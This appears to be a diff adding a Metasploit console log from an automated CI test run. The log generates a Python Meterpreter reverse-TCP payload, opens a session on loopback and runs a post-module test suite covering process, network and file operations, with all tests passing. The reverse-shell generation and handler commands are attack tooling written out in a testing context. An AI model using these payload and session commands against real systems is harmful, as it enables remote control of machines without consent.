@@ -1,0 +1,97 @@
+use python/meterpreter/reverse_tcp
+msf6 post(test/get_env) > generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220204-2608-oyhkzm.py -f raw AutoVerifySessionTimeout=10 MeterpreterTryToFork=false PythonMeterpreterDebug=true lport=6006 lhost=127.0.0.1
+msf6 payload(python/meterpreter/reverse_tcp) > [*] Writing 493 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220204-2608-oyhkzm.py...
+msf6 payload(python/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 5
+msf6 payload(python/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6006 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+[*] Meterpreter session 6 opened (127.0.0.1:6006 -> 127.0.0.1:50143 ) at 2022-02-04 02:58:53 +0000
+use test/meterpreter
+msf6 post(test/meterpreter) > run session=6 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Running against session 6
+[*] Session type is meterpreter and platform is windows
+before running test: should enumerate supported core commands
+[+] should enumerate supported core commands
+before running test: should support 3 or more core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+before running test: should return its own process id
+[*] Pid: 3640
+[+] should return its own process id
+before running test: should return a list of processes
+[*] PID info: {"pid"=>3640, "ppid"=>2608, "name"=>"python.exe", "path"=>"C:\\msys64\\mingw64\\bin\\python.exe", "session"=>nil, "user"=>"fv-az159-880\\runneradmin", "arch"=>"x64"}
+[+] should return a list of processes
+[*] Starting system config tests
+before running test: should return a user id
+[+] should return a user id
+before running test: should return a sysinfo Hash
+[+] should return a sysinfo Hash
+[*] Starting networking tests
+before running test: should return network interfaces
+[+] should return network interfaces
+before running test: should have an interface that matches session_host
+[+] should have an interface that matches session_host
+before running test: should return network routes
+[+] should return network routes
+[*] Starting filesystem tests
+before running test: should return the proper directory separator
+[+] should return the proper directory separator
+before running test: should return the current working directory
+[*] CWD: C:/Users/RUNNER~1/AppData/Local/Temp
+[+] should return the current working directory
+before running test: should list files in the current directory
+[+] should list files in the current directory
+before running test: should stat a directory
+[*] Current directory: "C:/Users/RUNNER~1/AppData/Local/Temp"
+[*] Stat of current directory: #<#<Class:0x000001ccebd7e740>:0x000001cced157618 @stathash={"st_dev"=>371408700, "st_mode"=>16895, "st_nlink"=>1, "st_uid"=>0, "st_gid"=>0, "st_rdev"=>371408700, "st_ino"=>562949953455419, "st_size"=>4096, "st_atime"=>1643943530, "st_mtime"=>1643943530, "st_ctime"=>1643879628}>
+[+] should stat a directory
+before running test: should create and remove a dir
+[*] Directory Name: meterpreter-test-dir-akmdxvph
+[*] Directory created successfully
+[*] Directory removed successfully
+[+] should create and remove a dir
+before running test: should change directories
+[*] Directory Name: meterpreter-test-dir-akmdxvph
+[*] Directory created successfully
+[*] Old CWD: C:/Users/RUNNER~1/AppData/Local/Temp
+[*] New CWD: C:/Users/RUNNER~1/AppData/Local/Temp/meterpreter-test-dir-akmdxvph
+[*] Back to old CWD: C:/Users/RUNNER~1/AppData/Local/Temp
+[*] Directory removed successfully
+[+] should change directories
+before running test: should create and remove files
+[*] File Name: meterpreter-test-akmdxvph
+[*] Wrote to meterpreter-test-akmdxvph, checking contents
+[*] Wrote test
+[+] should create and remove files
+before running test: should upload a file
+[*] Remote File Name: meterpreter-test-file-akmdxvph.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[+] should upload a file
+before running test: should move files
+[*] Source File Name: meterpreter-test-akmdxvph
+[*] Destination File Name: meterpreter-test-akmdxvph-moved
+[+] should move files
+before running test: should copy files
+[*] Source File Name: meterpreter-test-akmdxvph
+[*] Destination File Name: meterpreter-test-akmdxvph-copied
+[+] should copy files
+before running test: should do md5 and sha1 of files
+[*] Remote File Name: meterpreter-test-file-akmdxvph.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[*] remote md5: 24134c6583c9598a6d96f1491ffe1cf9
+[*] local md5 : 24134c6583c9598a6d96f1491ffe1cf9
+[*] remote sha: d45ddfd002d14e19d60101a9b495366295663992
+[*] local sha : d45ddfd002d14e19d60101a9b495366295663992
+[+] should do md5 and sha1 of files
+[*] Testing complete in 1.4801613
+[*] Passed: 20; Failed: 0
+[*] Cleanup: changing working directory back to D:/a/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+msf6 post(test/meterpreter) > 
